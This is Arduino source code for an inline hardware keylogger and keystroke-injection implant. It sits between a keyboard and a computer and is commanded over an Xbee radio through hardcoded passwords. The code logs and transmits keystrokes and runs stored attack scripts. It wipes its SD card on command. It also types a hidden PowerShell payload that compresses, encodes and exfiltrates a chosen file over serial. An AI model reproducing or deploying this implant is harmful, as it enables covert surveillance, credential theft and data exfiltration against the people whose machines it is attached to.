/*
 * Receive ASCII text from Serial1 and convert to USB HID report.
 * Send HID report out USB interface.
 * Maps out keystrokes and sends out data over ble when a central device is connected
 *
 * Using Serial 1 for now as interface with Xbee. This may change in the future
 * mySerial is a custom serial line added to handle incoming data from Trinket M0/keyboard
 * 
 * [ ]Added code to record time from last key press
 * [ ]Send out time from last key press when prompted for mode statuses
 * Update on 8/24/21 by Jonathan Fischer
 * 
 * ---passwords---
 * Activate: fOci0a25-x#p-u3?
 * Get Modes: YLwuhlTHEh1q7Ha!
 * Enable Tx Keystrokes: ce8hovfvemu@ap*B+H3s
 * Disable Tx Keystrokes: ce8hovevemu@ap*B+H3s
 * Enable Insomnia: jorLwabocUqeq6bRof$2
 * Disable Insomnia: jorLwbbocUqeq6bRof$2
 * Enable Keystroke Recorder: GatIQEMaNodE5L#p$T?l
 * Disable Keystroke Recorder: GatlQEMaNodE5L#p$T?l
 * Wipe SD Card/Stop Comm (Go Dark): 4+aJu2+6ATRES+ef_OtR
 * Launch Attack from Script: c01h2*+dIp?W3lpez*T=
 * Exfil Data File: 
 * Rx Attack Script: Jas?8jl2i2=p!aw#
 * Delete File: 5ec#?#l@1cRA9efe
 * Reset: mUrex$4retru?lPi
 * sendKeys: suHafU8i@=&ruxl$
 * printFiles: wEsLf9OZlsw$crLV
 */

#include <Arduino.h>
#include <wiring_private.h>
#include <Keyboard.h>
#include <Mouse.h>
#include <SPI.h>
#include <SD.h>



//Uart mySerial(&sercom2, ALT_SERCOM_RX, ALT_SERCOM_TX, PAD_mySerial_RX, PAD_mySerial_TX);

Uart mySerial (&sercom0, 5, 6, SERCOM_RX_PAD_1, UART_TX_PAD_0);

// Attach the interrupt handler to the SERCOM
void SERCOM0_Handler()
{
    mySerial.IrqHandler();
}


//File myFile;
String scriptName = "deleteMe.txt";
String recordName = "deleteMe2.txt";

//timer variables
unsigned long startMillis;
unsigned long currentMillis;
unsigned long elapsedMillis;

//password variables
String activatePW = "fOci0a25-x#p-u3?";
String getModesPW = "YLwuhlTHEh1q7Ha!";
String recKeysEnablePW = "GatIQEMaNodE5L#p$T?l";
String recKeysDisablePW = "GatlQEMaNodE5L#p$T?l";
String txKeysPW = "ce8hovfvemu@ap*B+H3s";
String disableKeyTxPW = "ce8hovevemu@ap*B+H3s";
String insomniaPW = "jorLwabocUqeq6bRof$2";
String allowSleepPW = "jorLwbbocUqeq6bRof$2";
String goDarkPW = "4+aJu2+6ATRES+ef_OtR";
String injectPW = "c01h2*+dIp?W3lpez*T=";
String rxScriptPW = "Jas?8jl2i2=p!aw#";
String resetPW = "5ec#?#l@1cRA9efe";
String deletePW = "mUrex$4retru?lPi";
String sendKeysPW = "suHafU8i@=&ruxl$";
String printFilesPW = "wEsLf9OZlsw$crLV";
String terminalPW = "dF2Gh@34G@#ga79!";
String terminalPWOFF = "dF2Gh@34G@#ga80!";
String exfilPW = "s$en*zET0aYozE!l-Tu0";
String exfilPWOFF = "s$en*zET0aYozE!l-Tu2";


//Toggle variables
bool activate = false; //allow outgoing communication with C2
bool txKeys = false;
bool insomnia = false;
bool record = false;
bool keyinject = false;
bool exfil = false;
bool rxScript = false;
bool rxScriptName = false;
bool fileName = false;
bool deleteScript = false;
bool sendKeyFile = false;
bool terminalMode = false;
bool exfilMode = false;
bool exfilStartVar = false;
String incoming = "";
String incoming1 = "";
String incoming2 = "";
bool startexfil = false;
char aLine[81];
byte oldKeys[81]  = {0,0,0,0,0,0,0,0};
byte newKeys[81] = {0,0,0,0,0,0,0,0};
byte oldKeys_Count = 8;
byte newKeys_Count = 0;
uint8_t aLine_count = 0;

void setup(){
  // Reassign pins 5 and 6 to SERCOM alt
pinPeripheral(5, PIO_SERCOM_ALT); //Rx
pinPeripheral(6, PIO_SERCOM_ALT); //Tx

Serial.begin(115200);
Serial1.begin(115200);
mySerial.begin(115200);
aLine_count = 0;

Serial.print("Initializing SD card...");
if (!SD.begin(4)) {
  Serial.println("initialization failed!");
  while (1);
  }
Serial.println("initialization done.");
}


uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
{
  char *p;
  uint8_t outbuf_count = 0;

  memset(outbuf, 0, outbuf_len);
  p = strtok(buf, ",");
  while (p != NULL && outbuf_count < outbuf_len) {
    *outbuf++ = strtoul(p, NULL, 10);
    outbuf_count++;
    p = strtok(NULL, ",");
  }
  return outbuf_count;
}


void loop() {   

    if (terminalMode) {
        if (Serial.available() > 0) {
        incoming1 = Serial.readString();
        Serial1.print(incoming1);
        Serial1.flush();
        delay(2000);
        
      }
    }
    
      if (exfilMode) {
        exfilStartVar = false;
        if (Serial.available() > 0) {
        incoming1 = Serial.readString();
        Serial1.print(incoming1);        
      }
    }
 
#ifdef Serial
  if (Serial.available() > 0) {
    char c = Serial.read();
    mySerial.write(c);
  }
#endif

  if (mySerial.available() > 0) {
    char c = mySerial.read();
#ifdef Serial
    //Serial.print("c 0x"); Serial.println(c, HEX);
#endif
    if (c == '\n' || aLine_count >= sizeof(aLine)) {
      aLine[aLine_count] = '\0';
#ifdef Serial
      if (record){
        recordKeys(aLine);
      }
      Serial.println(aLine);
#endif
      char command = aLine[0];
      uint8_t rawdata[8];
      uint8_t raw_len = params2bin(aLine+2, rawdata, sizeof(rawdata));
      aLine_count = 0;
      String message = "";
      if (raw_len > 0) {
        switch (command) {
          // Keyboard HID report
          case 'K':
          case 'k':
            startMillis = millis(); //set start of timer
            currentMillis = millis(); //reset current timer to equal start timer
            elapsedMillis = 0;
            if (raw_len != 8) break;
            if (rawdata[2] == 0){
              //if there is no key press regardless of modifiers, reset oldKeys array
              for (byte i = 0; i < oldKeys_Count; i++){
                oldKeys[i] = 0;
              }
            }
            if (rawdata[0] != 0) { //modifier pressed
              if (rawdata[0] != oldKeys[0]){
                //if modifier is different than last packet
                newKeys[0] = rawdata[0];
              }
            } else {
              newKeys[0] = 0;
            }
            newKeys_Count = 1; //counter for iteration to bypass mod byte
            for (byte i = 2; i < 8; i++){
              if (rawdata[i] > 0){
                byte input = rawdata[i];
                bool keyFound = false;
                //check to see if keypress was present in last recoreded key press
                for (byte k = 1; k < oldKeys_Count; k++){
                  if (oldKeys[k] = input){
                    Serial.print(oldKeys[k]); Serial.println(" is in the array");
                    keyFound = true;
                  } 
                }
                if (!keyFound) {
                  newKeys[newKeys_Count] = rawdata[i];
                  newKeys_Count++;
                }
              }
            }
            oldKeys_Count = newKeys_Count;
            for (byte i = 0; i < newKeys_Count; i++){
              oldKeys[i] = newKeys[i];
            }
            if (txKeys){
              txKeyPresses(newKeys, newKeys_Count);
            }
            HID().SendReport(2, rawdata, sizeof(KeyReport));
            break;
            // Mouse HID report
          case 'M':
          case 'm':
            if (raw_len != 4) break;
            HID().SendReport(1, rawdata, 4);
            break;
          default:
            break;
        }
      }
    }
    else {
      aLine[aLine_count++] = c;
    }
  }

  
  //rx incoming from xbee
  if (Serial1.available()) {
    incoming = Serial1.readString();
    Serial.println(incoming);
    if (activate) {
      //only allow functionality if activated by C2
      setMode(incoming);
    } else if (incoming == activatePW) {
      activate = true;
      Serial.println("Activate is set true");
    }
  }

  if (insomnia) {
    Mouse.begin();
    Mouse.move(1, 0);
    Mouse.move(-1,0);
    Mouse.end();
  }
}


void setMode(String pass){
  if (pass == resetPW){
    Serial.println("Reset mode enabled");
    reset();
  }else if (sendKeyFile){
    Serial.print("Receiving in key file name to send: ");
    Serial.println(pass);
    recordName = pass; 
    Serial.println("Sending key record data");
    sendKeyRecord(recordName); 
    sendKeyFile = false;
    Serial.print("Exiting key file transfer: ");
    Serial.println(sendKeyFile);   
  }else if (deleteScript) {
    Serial.println("deleteScript is set to true");
    Serial.print("File path for file to delete is: ");
    Serial.println(pass);
    SD.remove(pass);
    Serial.println("File removed");
    Serial1.println("File removed");
    deleteScript = false;
  }else if (keyinject == true) {
    Serial.println("Key Inject is set to true");
    Serial.print("File name is: ");
    Serial.println(pass);
    launchScript(pass);
    keyinject = false;
  }else if (exfil == true){
    Serial.println("Exfil is set to true");
    //exfilFunction(incoming);
    exfil = false;
  }else if (rxScript == true){
    Serial.println("Receiving in script data");
    saveScript(scriptName, pass);
  }else if (rxScriptName == true){
    Serial.print("Receiving in script name: ");
    Serial.println(pass);
    scriptName = pass;
    rxScript = true;
    rxScriptName = false;
  }else if (pass == getModesPW) {
    getModes();
  }else if (pass == recKeysEnablePW){
    Serial.println("Record Keys Enabled");
    record = true;
  }else if (pass == recKeysDisablePW){
    Serial.println("Record Keys Disabled");
    record = false;
  }else if (pass == txKeysPW){
    Serial.println("Transmit Keys Enabled");
    txKeys = true;
  }else if (pass == disableKeyTxPW){
    Serial.println("Transmit Keys Disabled");
    txKeys = false;
  }else if (pass == insomniaPW){
    Serial.println("Insomnia Enabled");
    insomnia = true;
  }else if (pass == allowSleepPW){
    Serial.println("Insomnia Disabled");
    insomnia = false;
  }else if (pass == goDarkPW){
    Serial.println("Wipe card and go into dark mode");
    reset();
    getWipe();
  }else if (pass == injectPW){
    Serial.println("Inject keystrokes enabled");
    File root = SD.open("/SCRIPTS/");
    String rootDir = "/";
    printScripts(root, rootDir);
    Serial1.println("<<<End of Message>>>");
    Serial1.flush();
    keyinject = true;

  }else if (pass == rxScriptPW){
    Serial.println("Receive Script enabled");
    rxScriptName = true;
  }else if (pass == deletePW){
    Serial.println("Deleting File mode enabled");
    File root = SD.open("/");
    String rootDir = "/";
    printScripts(root, rootDir);
    Serial1.println("<<<End of Message>>>");
    Serial1.flush();
    deleteScript = true; 
  }else if (pass == sendKeysPW){
    Serial.println("Send key record data Enabled");
    File root = SD.open("/Data/");
    String rootDir = "/";
    printScripts(root, rootDir);
    Serial1.println("<<<End of Message>>>");
    Serial1.flush();
    sendKeyFile = true;
  }else if (pass == printFilesPW){
    Serial.println("Send list of SD card contents");
    File root = SD.open("/");
    String rootDir = "/";
    printScripts(root, rootDir);
    Serial1.println("<<<End of Message>>>");
    Serial1.flush();
  }
   
   else if (pass == terminalPW){
    Serial.println("TERMINAL");
    terminalMode = true;
    Serial1.println("<<<End of Message>>>");
    Serial1.flush();
    }

   else if (pass == terminalPWOFF){
    Serial.println("TERMINAL OFF");
    terminalMode = false;
    Serial1.flush();
    }
     else if (pass == exfilPW){
    Serial.println("EXFIL ON");
    exfilStartVar = true;
    Serial1.flush();
    }
    else if (exfilStartVar == true) {
      exfilStartVar = false;
      exfilStart(pass);
      Serial1.flush();
      }

   else if (pass == exfilPWOFF){
    Serial.println("EXFIL OFF");
    exfilMode = false;
    exfilStartVar = false;
    Serial1.flush();
    }
 
}

void getWipe(){
  File root = SD.open("/");
  String rootDir = "/";
  wipeCard(root, "/");
}

void wipeCard(File dir, String d) {
  while (true) {
    String dirname = d;
    File entry =  dir.openNextFile();
    if (! entry) {
      // no more files
      break;
    }
    String filename = entry.name();
    if (entry.isDirectory()) {
      dirname.concat(entry.name());
      dirname.concat("/");
      wipeCard(entry, dirname);
      SD.rmdir(dirname);
    } else {
      // files have sizes, directories do not
      dirname.concat(entry.name());
      SD.remove(dirname);
    }
    entry.close();
  }
}

void exfilStart(String n) {
  
exfilStartVar = false;
inject("ps-LEFT_GUI");
inject("dl-250");
inject("ra-");
inject("dl-1000");
inject("pt-powershell");
inject("dl-250");
inject("ps-RETURN");
inject("ra-");
inject("dl-500");
  String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_2341&PID_8057&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
  inject(exfilHide);
  delay(1000);
  inject("ps-RETURN");
  inject(exfilCode);
  delay(5000);
  inject("dl-250");
  inject("ps-RETURN");
  inject("ra-");
  inject("ps-RETURN");
  inject("ra-");
  exfilStartVar = false;
  exfilMode = true;
  Serial1.flush();

}


void recordKeys(String d){
  if (SD.exists("/Data/") == false){
    SD.mkdir("/Data/");
  }
  String path = "/Data/keys.txt";
  File keyFile = SD.open(path, FILE_WRITE);
  if (keyFile) {
    keyFile.println(d);
    Serial.println("Printing data to file");
  }
  keyFile.close();
}

void sendKeyRecord(String n){
  String path = "/Data/" + n;
  File myFile = SD.open(path);
  String line = "";
  Serial.print("Opening path: ");
  Serial.println(path);
  if (myFile){
    Serial.println("File Exists");
    while (myFile.available()){
      char data = myFile.read();
      if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
      //  if (line.length() > 1){ //don't send blank lines
      //    //send the line for injection mapping
      //    Serial1.print(line);
      //  }
        line.concat(data);
        Serial.print("Sending line: ");
        Serial.println(line);
        Serial1.print(line);
        Serial1.flush();
        delay(50);
        line = "";
      } else {
        line.concat(data);
      }      
    }
  }
  Serial1.println("<<<EOF>>>");
}

void printScripts(File dir, String d){
  Serial.println("Entering printScripts method");
  while (true) {
    String dirname = d;
    File entry = dir.openNextFile();
    if (!entry) {
      //no more lines
      break;
    }
    String filename = entry.name();
    if (entry.isDirectory()) {
      dirname.concat(entry.name());
      dirname.concat("/");
      printScripts(entry, dirname);
    } else {
      dirname.concat(entry.name());
      Serial.print("Script found: ");
      Serial.println(dirname);
      Serial1.println(dirname);
      Serial1.flush();
      delay(200);
    }
    entry.close();
  }
  dir.close();
}

void launchScript(String n) {
/* Keystroke Injection/Attack Script layout
*ps-<Key> = Keyboard.press(<KEY>) or Keyboard.press('<char>') 
*pt-<String> = Keyboard.print("<String>")
*ra- = Keyboard.releaseAll();
*dl-<# of milliseconds> = delay(<# of milliseconds>)
*/
//exit function if script name is returned as <<<Abort>>>
//This indicates that no scripts were relayed to the C2
  if (n == "<<<Abort>>>"){
    Serial.println("Aborting key injection");
    return;
  }
  String path = "/Scripts/" + n;
  File myFile = SD.open(path);
  String line = "";
  Serial.print("Opening path: ");
  Serial.println(path);
  if (myFile){
    Serial.println("File Exists");
    while (myFile.available()){
      Serial.println("File opened successfully");
      //read in complete line from file and assign to a string variable
      char data = myFile.read();
      if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
        if (line.length() > 1){ //don't send blank lines
          //send the line for injection mapping
          inject(line);
        }
        line = "";
      } else {
        line.concat(data);
      }
    }
    myFile.close();
    Serial.println("File was launched successfully");
    Serial1.println("File was launched successfully");
    Serial1.flush();
  } else {
    myFile.close();
    Serial.println("There was an error reading the submitted script name");
    Serial1.println("There was an error reading the submitted script name");
    Serial1.flush();
  }
}

void inject(String s){
  Keyboard.begin();
  int len = s.length();
  String command = s.substring(3,len);
  if (s.startsWith("ps")){
    //indicates Keyboard.press()
     // String cCommand = s.substring(3,len); 
      Keyboard.press(mapChars(command));
  }
  else if(s.startsWith("pt")){
  //indicates keyboard.print()
    Keyboard.print(command);
  } 
  else if(s.startsWith("r")){
    Keyboard.releaseAll();
  } 
  else if (s.startsWith("d")){
    delay(command.toInt());
  }
  else {
    Serial.println("There was an error with the script parsing.");
    Serial.println("Exiting Attack script.");
    Keyboard.end();
    return;
  }
  Keyboard.end();
  return;
}

void getModes(){
  if (record){
    Serial.println("Key recorder mode: active");
    Serial1.println("Key recorder mode: active");
  } else {
    Serial.println("Key recorder mode: deactivated");
    Serial1.println("Key recorder mode: deactivated");
  }

  if (insomnia){
    Serial.println("Insomnia mode: active");
    Serial1.println("Insomnia mode: active");
  } else{
    Serial.println("Insomnia mode: deactived");
    Serial1.println("Insomnia mode: deactived");
  }
  String timer = getTimer();
  Serial.println(timer);
  Serial1.println(timer);
  Serial1.flush();
  delay(100);
  Serial1.println("<<<End of Message>>>");
}



void saveScript(String n, String s){
  if (SD.exists("/SCRIPTS/") == false){
    SD.mkdir("/Scripts/");
  }
  String path = "/SCRIPTS/" + n;
  Serial.print("The file path is: ");
  Serial.println(path);
  if (s == "EOF"){
    rxScript = false;
  }
  else{
    File myFile = SD.open(path, FILE_WRITE);
    if (myFile) {
      myFile.println(s);
    }
    myFile.close();
  }
}


void reset(){
  //resets all toggles to get out of any loop that it may be stuck in
activate = false; //allow outgoing communication with C2
txKeys = false;
insomnia = false;
record = false;
keyinject = false;
exfil = false;
rxScript = false;
rxScriptName = false;
fileName = false;
deleteScript = false;
sendKeyFile = false;
incoming = "";
}

char mapChars(String s){
  if (s == "LEFT_CTRL"){
    return 0x80;
  }
  else if (s == "LEFT_SHIFT"){
    return 0x81;
  }
  else if (s == "LEFT_ALT"){
    return 0x82;
  }
  else if (s == "LEFT_GUI"){
    return char(0x83);
  }
  else if (s == "RIGHT_CTRL"){
    return 0x84;
  }
  else if (s == "RIGHT_SHIFT"){
    return 0x85;
  }
  else if (s == "RIGHT_ALT"){
    return 0x86;
  }
  else if (s == "RIGHT_GUI"){
    return 0x87;
  }
  else if (s == "UP_ARROW"){
    return 0xDA;
  }
  else if (s == "DOWN_ARROW"){
    return 0xD9;
  }
  else if (s == "LEFT_ARROW"){
    return 0xD8;
  }
  else if (s == "RIGHT_ARROW"){
    return 0xD7;
  }
  else if (s == "BACKSPACE"){
    return 0xB2;
  }
  else if (s == "TAB"){
    return 0xB3;
  }
  else if (s == "RETURN"){
    return 0xB0;
  }
  else if (s == "ESC"){
    return 0xB1;
  }
  else if (s == "INSERT"){
    return 0xD1;
  }
  else if (s == "DELETE"){
    return 0xD4;
  }
  else if (s == "PAGE_UP"){
    return 0xD3;
  }
  else if (s == "PAGE_DOWN"){
    return 0xD6;
  }
  else if (s == "HOME"){
    return 0xD2;
  }
  else if (s == "END"){
    return 0xD5;
  }
  else if (s == "CAPS_LOCK"){
    return 0xC1;
  }
  else if (s == "F1"){
    return 0xC2;
  }
  else if (s == "F2"){
    return 0xC3;
  }
  else if (s == "F3"){
    return 0xC4;
  }
  else if (s == "F4"){
    return 0xC5;
  }
  else if (s == "F5"){
    return 0xC6;
  }
  else if (s == "F6"){
    return 0xC7;
  }
  else if (s == "F7"){
    return 0xC8;
  }
  else if (s == "F8"){
    return 0xC9;
  }
  else if (s == "F9"){
    return 0xCA;
  }
  else if (s == "F10"){
    return 0xCB;
  }
  else if (s == "F11"){
    return 0xCC;
  }
  else if (s == "F12"){
    return 0xCD;
  }
  else {
    int asize = s.length();
    char out[asize];
    s.toCharArray(out, asize);
    if (asize == 1){
      return out[0];
    } else {
      return 0x00;
    }
  }
}

String getMod (byte m){
  String output = "";
  if (m > 64){
    output.concat("RtAlt ");
    m = m - 64;
  }
  else if (m == 64){
    output.concat("RAlt");
    m = m - 64;
  }
  if (m == 34){
    //both shifts are pressed
    m = m - 34;
  }
  if (m > 32){
    //don't print if shift is only modifier pressed
    output.concat("RtShft ");
    m = m - 32;
  }
  else if (m == 32) {
    //output.concat("RtShft");
    m = m - 32;
  }
  if (m > 16) {
    output.concat("RtCtrl ");
    m = m - 16;
  }
  else if (m == 16){
    output.concat("RtCtrl");
    m = m - 16;
  }
  if (m > 8) {
    output.concat("LtGUI ");
    m = m - 8;
  }
  else if (m == 8) {
    output.concat("LtGUI");
    m = m - 8;
  }
  if (m > 4) {
    output.concat("LtAlt ");
    m = m - 4;
  }
  else if (m == 4) {
    output.concat("LtAlt");
    m = m -4;
  }
  if (m > 2) {
    output.concat("LtShft ");
    m = m - 2;
  }
  else if (m == 2) {
    //Don't print if shift is only modifier pressed
    //output.concat("LtShft");
    m = m - 2;
  }
  if (m == 1) {
    output.concat("LtCtrl");
  }
  return output;
}

String getKeys(byte k){
//if shift is detected, 100 is added to k to map to Upper Case letters  
  switch (k){
    case 0:
      return String("");
    case 1:
      return "[Key1NotFound]";
    case 2:
      return "[Key2NotFound]";
    case 3:
      return "[Key3NotFound]";
    case 4:
      return "a";
    case 5:
      return "b";
    case 6:
      return "c";
    case 7:
      return "d";
    case 8:
      return "e";
    case 9:
      return "f";
    case 10:
      return "g";
    case 11:
      return "h";
    case 12:
      return "i";
    case 13:
      return "j";
    case 14:
      return "k";
    case 15:
      return "l";
    case 16:
      return "m";
    case 17:
      return "n";
    case 18:
      return "o";
    case 19:
      return "p";
    case 20:
      return "q";
    case 21:
      return "r";
    case 22:
      return "s";
    case 23:
      return "t";
    case 24:
      return "u";
    case 25:
      return "v";
    case 26:
      return "w";
    case 27:
      return "x";
    case 28:
      return "y";
    case 29:
      return "z";
    case 30:
      return "1";
    case 31:
      return "2";
    case 32:
      return "3";
    case 33:
      return "4";
    case 34:
      return "5";
    case 35:
      return "6";
    case 36:
      return "7";
    case 37:
      return "8";
    case 38:
      return "9";
    case 39:
      return "0";
    case 40:
      return "[ENTER]"; //Enter
    case 41:
      return "[ESC]";
    case 42:
      return "[BKSPC]";
    case 43:
      return "[TAB]";
    case 44:
      return " "; //Spacebar
    case 45:
      return "-";
    case 46:
      return "=";
    case 47:
      return "[";
    case 48:
      return "]";
    case 49:
      return "'\'";
    case 50:
      return "[Key50NotMapped]";
    case 51:
      return ";";
    case 52:
      return "'";
    case 53:
      return "`";
    case 54:
      return ",";
    case 55:
      return ".";
    case 56:
      return "/";
    case 57:
      return "[CAPSLOCK]";
    case 58:
      return "[F1]";
    case 59:
      return "[F2]";
    case 60:
      return "[F3]";
    case 61:
      return "[F4]";
    case 62:
      return "[F5]";
    case 63:
      return "[F6]";
    case 64:
      return "[F7]";
    case 65:
      return "[F8]";
    case 66:
      return "[F9]";
    case 67:
      return "[F10]";
    case 68:
      return "[F11]";
    case 69:
      return "[F12]";
    case 70:
      return "[PRNT_SCRN]";
    case 71:
      return "[SCRN_LCK]";
    case 72:
      return "[Key72NotMapped]";
    case 73:
      return "[INS]";
    case 74:
      return "[HOME]";
    case 75:
      return "[PG_UP]";
    case 76:
      return "[DEL]";
    case 77:
      return "[END]";
    case 78:
      return "[PG_DN]";
    case 79:
      return "[ARW_R]";
    case 80:
      return "[ARW_L]";
    case 81:
      return "[ARW_D]";
    case 82:
      return "[ARW_U]";
    case 83:
      return "[NUM_LCK]";
    case 84:
      return "[Key84NotMapped]";
    case 85:
      return "[Key85NotMapped]";
    case 86:
      return "[Key86NotMapped]";
    case 87:
      return "[Key87NotMapped]";
    case 88:
      return "[Key88NotMapped]";
    case 89:
      return "[Key89NotMapped]";
    case 90:
      return "[Key90NotMapped]";
    case 91:
      return "[Key91NotFound]";
    case 92:
      return "[Key92NotFound]";
    case 93:
      return "[Key93NotFound]";
    case 94:
      return "[Key94NotFound]";
    case 95:
      return "[Key95NotFound]";
    case 96:
      return "[Key96NotFound]";
    case 97:
      return "[Key97NotFound]";
    case 98:
      return "[Key98NotFound]";
    case 99:
      return "[Key99NotFound]";
    case 100:
      return "[Key100NotFound]";
    case 101:
      return "[RT_GUI]";
    case 102:
      return "[Key102NotFound]";
    case 103:
      return "[Key103NotFound]";
    case 104:
      return "A";
    case 105:
      return "B";
    case 106:
      return "C";
    case 107:
      return "D";
    case 108:
      return "E";
    case 109:
      return "F";
    case 110:
      return "G";
    case 111:
      return "H";
    case 112:
      return "I";
    case 113:
      return "J";
    case 114:
      return "K";
    case 115:
      return "L";
    case 116:
      return "M";
    case 117:
      return "N";
    case 118:
      return "O";
    case 119:
      return "P";
    case 120:
      return "Q";
    case 121:
      return "R";
    case 122:
      return "S";
    case 123:
      return "T";
    case 124:
      return "U";
    case 125:
      return "V";
    case 126:
      return "W";
    case 127:
      return "X";
    case 128:
      return "Y";
    case 129:
      return "Z";
    case 130:
      return "!";
    case 131:
      return "@";
    case 132:
      return "#";
    case 133:
      return "$";
    case 134:
      return "%";
    case 135:
      return "^";
    case 136:
      return "&";
    case 137:
      return "*";
    case 138:
      return "(";
    case 139:
      return ")";
    case 140:
      return "[Key140NotMapped]";
    case 141:
      return "[Key141NotMapped]";
    case 142:
      return "[Key142NotMapped]";
    case 143:
      return "[Key143NotMapped]";
    case 144:
      return "[Key144NotMapped]";
    case 145:
      return "_";
    case 146:
      return "+";
    case 147:
      return "{";
    case 148:
      return "}";
    case 149:
      return "'|'";
    case 150:
      return "[Key150NotMapped]";
    case 151:
      return ":";
    case 152:
      return "\"";
    case 153:
      return "~";
    case 154:
      return "<";
    case 155:
      return ">";
    case 156:
      return "?";
    default:
      return "[KeyNotFound]";
      break;
  }
}

bool arrayContains(byte in, byte arrayCount){
  String old = "";
  for (byte z = 0; z < arrayCount; z++){
    old.concat(String(oldKeys[z]) + " ");
  }
  Serial.print("Array Size is: "); Serial.println(arrayCount);
  Serial.print("Input is: "); Serial.println(in);
  Serial.print("Array to compare is: "); Serial.println(old);
  for (byte k = 1; k < arrayCount; k++){
    Serial.print("K value: "); Serial.println(k);
    if (oldKeys[k] == in){
      Serial.print(oldKeys[k]); Serial.println(" is in the array");
      return true;
    } else {
      Serial.print(oldKeys[k]); Serial.println(" is not in the array");
    }
  }
  return false;
}

bool getShift(byte m){
  bool output = false;
  if (m > 64){
    m = m - 64;
  }
  else if (m == 64){
    m = m - 64;
  }
  if (m > 32){
    output = true;
    m = m - 32;
  }
  else if (m == 32) {
    output = true;
    m = m - 32;
  }
  if (m > 16) {
    m = m - 16;
  }
  else if (m == 16){
    m = m - 16;
  }
  if (m > 8) {
    m = m - 8;
  }
  else if (m == 8) {
    m = m - 8;
  }
  if (m > 4) {
    m = m - 4;
  }
  else if (m == 4) {
    m = m -4;
  }
  if (m > 2) {
    output = true;
    m = m - 2;
  }
  else if (m == 2) {
    output = true;
    m = m - 2;
  }
  return output;  
}


void txKeyPresses(byte txArray[81], byte count){
  byte modVal = 0;
  String message = "";
  message.concat(getMod(txArray[0]));
  if (getShift(txArray[0])){
    modVal = 100;
  }
  for(byte i = 1; i < count; i++){
    byte keyVal = modVal + txArray[i];
    message.concat(getKeys(keyVal));
  }
 // return message;
  if (message != ""){
    //Serial.print("TxArray first key value: "); Serial.println(txArray[1]);
    if (txArray[1] != 0) {
      Serial.print("Sending: ");Serial.println(message);
      Serial1.print(message);
      Serial1.flush();
    }
  }
}


String getTimer(){
  String elapsedTime = "";
  currentMillis = millis();
  elapsedMillis = (currentMillis - startMillis);
  unsigned long remainingTime = elapsedMillis;
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durH = (remainingTime/(3600000)); //Elapsed Hours
  Serial.print("durH value: "); Serial.println(durH);
  remainingTime = remainingTime-(durH*3600000); //remove hours from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durM = (remainingTime/(60000)); //Elapsed minutes
  Serial.print("durM value: "); Serial.println(durM);
  remainingTime = remainingTime-(durM*60000); //removed minutes from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durS = (remainingTime/1000); //Elapsed seconds  
  Serial.print("durS value: "); Serial.println(durS);
  remainingTime = remainingTime-(durS*1000); //remove seconds from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durMS = (remainingTime); //time left is elapsed milliseconds  
  Serial.print("durMS value: "); Serial.println(durMS);
  Serial.print("Elapsed millis value: "); Serial.println(elapsedMillis);
  elapsedTime = timeMillis(durH,durM,durS,durMS);
  return elapsedTime;
}

String timeMillis(unsigned long timeH, unsigned long timeM, unsigned long timeS, unsigned long timeMS){
  String tempTime = "";
  if (timeH < 10) {
    tempTime = tempTime + "0" + String(timeH) + "h:";
  }
  else{
    tempTime = tempTime + String(timeH) + "h:";
  }

  if (timeM < 10) {
    tempTime = tempTime + "0" + String(timeM) + "m:";
  }
  else{
    tempTime = tempTime + String(timeM) + "m:";
  }

  if (timeS < 10) {
    tempTime = tempTime + "0" + String(timeS) + "s:";
  }
  else{
    tempTime = tempTime + String(timeS) + "s:";
  }

  if (timeMS < 10) {
    tempTime = tempTime + "0" + String(timeMS) + "ms";
  }
  else{
    tempTime = tempTime + String(timeMS) + "ms";
  }

  tempTime = "Last key press: " + String(tempTime);
  return tempTime;
}